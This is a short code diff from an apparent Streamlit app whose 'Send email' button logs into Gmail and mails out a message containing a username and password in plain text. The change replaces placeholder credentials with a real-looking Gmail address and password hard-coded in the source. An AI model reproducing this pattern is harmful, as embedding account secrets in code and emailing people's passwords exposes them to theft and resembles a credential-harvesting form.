@@ -22,7 +22,7 @@ if st.button("Send email"):
         server = smtplib.SMTP('smtp.gmail.com', 587)
         server.ehlo()
         server.starttls()
-        server.login("your_email@gmail.com", "your_email_password")
+        server.login("aptest2177@gmail.com", "Routine77!")
 
         subject = "Username and Password"
         body = "Username: " + username + "\nPassword: " + password
